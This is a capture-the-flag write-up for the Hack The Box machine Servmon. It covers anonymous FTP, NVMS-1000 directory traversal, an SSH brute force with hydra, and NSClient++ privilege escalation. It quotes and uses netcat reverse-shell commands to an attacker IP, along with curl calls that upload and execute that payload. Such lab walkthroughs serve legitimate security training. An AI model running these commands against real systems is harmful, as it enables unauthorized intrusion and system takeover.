## HTB - Servmon

## Overview

![Descriptive information card on the machine servmon](/assets/img/screenshot_2020-06-19_22-12-49.png)

This was an easy Windows machine....but don't get stuck chasing the rabbits! This machine is on TJ_Null's list of OSCP-like machines.  Have fun!

## Useful Skills and Tools

### Logging into FTP Anonymously

1. ftp &lt;remote\_ip&gt;
2. Name: anonymous

   331 Anonymous access allowed, send identity \(e-mail name\) as password.

3. Password: any@email.address

### Windows files in static locations for LFI testing purposes

* C:\Windows\win.ini
* C:\Users\&lt;username&gt;\Desktop\desktop.ini
  * If you have already gathered a potential username

### Using SSH to forward local ports to access secured remote assets

`ssh -L <local_port>:<remote_address>:<remote_port> <username>@<server_ip>`

### PowerShell history file location

`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.184`.  The options I regularly use are: 

| `Flag` | Purpose |
| :--- | :--- |
| `-p-` | A shortcut which tells nmap to scan all ports |
| `-vvv` | Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown |
| `-sC` | Equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target |
| `-sV` | Does a service version scan |
| `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |

Lots of open ports on this machine.  There are a number of clues in this output that would tell you that this is a Windows machine such as ports `135 - Microsoft Windows RPC`, `139 - Netbios`, and `445 - Server Message Block (SMB)`.  The FTP client also reports `SYST: Windows_NT` and SSH is running on `OpenSSH for_Windows_7.7`.  With that, it's usually best to start with enumerating the low ports that are well known.  

### Anonymous FTP

If port `21 - FTP` is open, that is usually a good place to start as logging in as `Anonymous` can be an easy way to find useful information. To do this enter `anonymous` when it prompts you for a name, then give an email address when it prompts for a password.  This does not have to be a real address, just in the format `a@b.c`.

```

Through FTP I was able to find two different users, `Nadine` and `Nathan`.  Each user's folder had a text document in it with some interesting information. 

```text
zweilos@kalimaa:~/htb/servmon$ cat 'Notes to do.txt'
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

`Nathan`'s folder contained a to-do list that lets us know that there are two services `NVMS` and `NSClient` on this machine, the security of which has not been completely locked down.  It seems as if public access to `NVMS` should still be still available, and whatever "secret files" may still be in an accessible location.

```text
zweilos@kalimaa:~/htb/servmon$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

The file `Confidential.txt` in `Nadine`'s folder gave me some more good news.  She left `Nathan` a file on his desktop that looks to contain passwords.  This may be one of the "secret files" that `Nathan` was planning to lock up in SharePoint that he hadn't gotten to yet. 

### HTTP - Port 80 üêáüêá

Since I still didn't have a way in, the next place to enumerate was HTTP on port 80.  Navigating to `http://10.10.10.181` redirected to `http://10.10.10.184/Pages/login.htm` which had a page title of `NVMS-1000`.  This looks like the page with public access that `Nathan`'s to-do list had mentioned.  

![NVMS-1000 Web Portal](/assets/img/screenshot_2020-06-20_17-14-29.png)

### NVMS-1000 Exploit Research

A quick exploit search using `searchsploit nvms 1000` found a directory traversal exploit for this web portal at [https://www.exploit-db.com/exploits/47774](https://www.exploit-db.com/exploits/47774), and also a Metasploit scanner to check for this vulnerability at [https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt\_nvms\_traversal](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt_nvms_traversal).  


> _Bypassing the login to this portal is possible, but I'm pretty sure it is a huge rabbit hole that sucked me in for quite awhile._


## Initial Foothold

Can use GET requests and directory traversal to access files on the system.  Blog from Rapid7 shows good way to test for LFI and directory traversal for Windows. since we know the location of the `Passwords.txt` file, use this to exfiltrate

* https://blog.rapid7.com/2016/07/29/pentesting-in-the-real-world-local-file-inclusion-with-windows-server-files/

I used Burp suite's repeater tool to craft my requests and test for this vulnerability on this machine.

![Checking for LFI through directory traversal](/assets/img/screenshot_2020-06-20_20-53-48.png)

The machine was indeed vulnerable, and I used the information from the message `Nadine` left for `Nathan` to form my directory traversal GET request.  The server returned a list of seven passwords for me try out.

## Road to User

Now that I had some credentials, it was time to try to log into the machine with them.  I decided to use the tool`hydra` to do a brute force attack against SSH for both users `Nathan` and `Nadine`.

```text
zweilos@kalimaa:~/htb/servmon$ hydra -l Nadine -P passwords 10.10.10.184 ssh

### Metagaming - Other user's artifacts

As you can see in this output, there were at least a few different people working on this machine around the same time as me, and that they had left their enumeration scripts behind. On my first couple Hack the Box attempts I found useful information in a public location and thought it was part of the box, only later to find out that I had been receiving spoilers due to other user's artifacts. _Please be courteous to other users in this shared environment and clean up after yourself!_  

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User `Nadine`

I was able to find a PowerShell history file for `Nadine` at `C:\Users\Nadine\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`, though there was nothing relevant to the challenge..._there were however, lots of attempts to do things \(some quite humorous!\) from other users though!  Unfortunately I accidentally deleted the contents while cleaning up my notes for publishing so you can't enjoy them too._

After browsing through the installed programs I came across something I didn't recognize: `NSClient++`.  

```text

 2018-01-15 Michael Medin

 * Added tracing and fixed some issues to op5 client
 * Fixed #525 json spirit should be an optional dependency (though a lot of things break without it)

...snipped for brevity...
```

The changelog didn't really hold any information that seemed useful at first, though it did give me an idea of how long it had been since the program had received an update: 2018-01-18. 

```text

```

I found a potential password in the `nsclient.ini` folder, though I wasn't sure what it might go to.  It didn't work for the Administrator account, unfortunately.  Near the bottom of this file were some obvious edits by other users, so I knew this had to be important.  I reset the box to avoid spoiling the rest of it for myself. 

### NSClient++ Exploit Research

A Google search of `nsclient++ changelog` led to [http://www.nsclient.org/download/0.5.2/](http://www.nsclient.org/download/0.5.2/), where I was able to correlate the dates in the `changelog.txt` with the versions of the program's releases.  It looked like the installed program was nightly build version 0.5.2.31 from 2018-01-18. 

Again, a quick `Searchsploit` check found an exploit that might work for this version of `NSClient++`.  [https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)

```text
Exploit Author: bzyo
Twitter: @bzyo_
Exploit Title: NSClient++ 0.5.2.35 - Privilege Escalation
Date: 05-05-19
Vulnerable Software: NSClient++ 0.5.2.35
Vendor Homepage: http://nsclient.org/
Version: 0.5.2.35
Software Link: http://nsclient.org/download/
Tested on: Windows 10 x64

Details:
When NSClient++ is installed with Web Server enabled, local low privilege users 
have the ability to read the web administator's password in cleartext from the 
configuration file.  From here a user is able to login to the web server and 
make changes to the configuration file that is normally restricted.  

The user is able to enable the modules to check external scripts and schedule 
those scripts to run.  There doesn't seem to be restrictions on where the scripts 
are called from, so the user can create the script anywhere.  Since the NSClient++ 
Service runs as Local System, these scheduled scripts run as that user and the low 
privilege user can gain privilege escalation.  A reboot, as far as I can tell, is 
required to reload and read the changes to the web config.  

Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local 
access to a system running NSClient++ with Web Server enabled using a low 
privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
	C:\Program Files\NSClient++>nscp web -- password --display
	Current password: SoSecret

2. Login and enable following modules including enable at startup and save 
configuration:
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
	@echo off
	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
	nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
	- foobar
		command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
	- foobar
		interval = 1m
		command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
	nc -nlvvp 443
	listening on [any] 443 ...
	connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
	Microsoft Windows [Version 10.0.17134.753]
	(c) 2018 Microsoft Corporation. All rights reserved.

	C:\Program Files\NSClient++>whoami
	whoami
	nt authority\system
	
Risk:
The vulnerability allows local attackers to escalate privileges and execute 
arbitrary code as Local System
```

Well this didn't look too awfully complicated.  I now had step-by-step instructions for privilege escalation all the way to `nt authority\system`.  

```text
nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display 

Current password: ew2x6SsGTxjRwXOT
```

Running the command in the exploit to get the NSCP web client administrator password gave me the same password that I had seen in the `nsclient.ini` file.  

Looking back through my notes, I saw that there was a port I hadn't checked out yet from my early Nmap scan.  Port TCP 8443 showed a website with the information `http-title: NSClient++`.  Navigating to `http://10.10.10.184:8443` resulted in failure.  After doing a bit more looking around I found an entry in `nsclient.ini` that seemed to specify that the Web interface could only be accessed from the specified hosts, which only included 127.0.0.1 in this case.  _Later I noticed the port was also listed in nsclient.ini, oops._ 

#### Using SSH to create a redirect tunnel \(Local Port Forwarding\)

In order to access this page through the web browser without some sort of remote desktop capability I had to set up port forwarding from my local machine to the remote host.  Since the web portal would only accept traffic from it's own localhost on port 8443, we needed to set up some way to redirect traffic to and from my browser to appear to come from the remote machine.  Luckily this is pretty easy to do with SSH.

* https://www.howtogeek.com/168145/how-to-use-ssh-tunneling/

`ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184`

### The web portal on port 8443

https://127.0.0.1:8443/index.html\#/

![](/assets/img/screenshot_2020-06-20_22-54-12.png)

The web portal seemed somewhat complicated to interact with, and the instructions given in the exploit weren't completely clear how to link to the `evil.bat` script and it's scheduler through the web portal.  After doing lots of reading through the documentation on `nsclient`, I discovered an easier sounding method of interacting with the service.

### Taking the API route

While reading through the API documentation at [https://docs.nsclient.org/api/scripts/](https://docs.nsclient.org/api/scripts/) I thought it sounded like a much easier to deal with route than going through the web portal.  With just two simple commands I could upload my script and execute a query against that script to get it to run. The documentation even gave specifics on how to upload the contents of the script by passing it as a string in the command, rather than actually creating and sending a file.

```text
Example¬∂
Given a file called check_new.bat which contains the following:


@echo OK: %1
@exit 0
We can use the following curl call to upload that as check_new.


curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/check_new.bat --data-binary @check_new.bat
Added check_new as scripts\check_new.bat
```

For my payload script I still used the one recommended by the exploit author, even though I was sending it to the server by a different method.  It was a very simple netcat reverse shell..

```text
#@echo off
c:\Temp\nc.exe 10.10.14.15 4443 -e cmd.exe
```

To send the payload to the server I used `curl` as specified by the documentation and sent the contents of my payload script as `--data-binary "<string>"`.   It prompted me to enter the admin password we had retrieved from the nscp client.  

```text
nadine@SERVMON C:\Temp>curl -s -k -u admin -X PUT \
 https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat \
 --data-binary "C:\Temp\nc.exe 10.10.15.20 12345 -e cmd.exe" 

 Enter host password for user 'admin': 
 Added evil as scripts\evil.bat
```

After sending the script it let me know that it had added the script under the name `evil`.  This is the name to use to run a query against it in order to run it.

```text
nadine@SERVMON C:\Users\Nadine>curl -s -k -u admin \
 https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m
```

At first, I tried executing the script but I didn't receive a reverse shell.  I realized after doing a bit of troubleshooting that I hadn't actually uploaded `nc.exe` to the remote host. My command to transfer the file had not completed successfully, but I had missed the error message it gave in my rush to finish since it was well past my bedtime. _Let this be a lesson to always take your time and pay attention to details, no matter how tired or in a hurry you may be :\)_

               2 Dir(s)  27,866,644,480 bytes free

```

I was not the only to make mistakes while transferring files to this machine.  Another user had tried to upload `nc.exe` \(_I overwrote this_\) and their `evil.bat` to the `C:\Temp` folder but had failed \(_file size of 0 bytes seen above_\).  I figured out that had forgotten to add `--output <file_name>` at first.  Luckily it gave a warning to remind me of this.  

```text
nadine@SERVMON C:\Temp>curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m
Enter host password for user 'admin':

{"command":"evil","lines":[{"message":"Command evil didn't terminate within the timeout period 60s","pe
rf":{}}],"result":3}
```

Despite the error message seen above, once I successfully uploaded `nc.exe` to the folder I had specified in my payload `C:\Temp`, and then sent the execute query once again, I received my reverse shell on my host machine.  The error message above I believe is to let an administrator know that there was a long-running script that did not terminate within the specified timeout period.

Bam!  Now I was logged in as `nt authority\system` and had full control of the system.

### root.txt

The last thing to do was, of course_,_ to collect my proof.  

```text
C:\Program Files\NSClient++>type C:/Users/Administrator/Desktop/root.txt
type C:/Users/Administrator/Desktop/root.txt
The syntax of the command is incorrect.
```

_Oops. Apparently in a `cmd.exe` shell the direction of the slash is important when using `type` to read a file!_
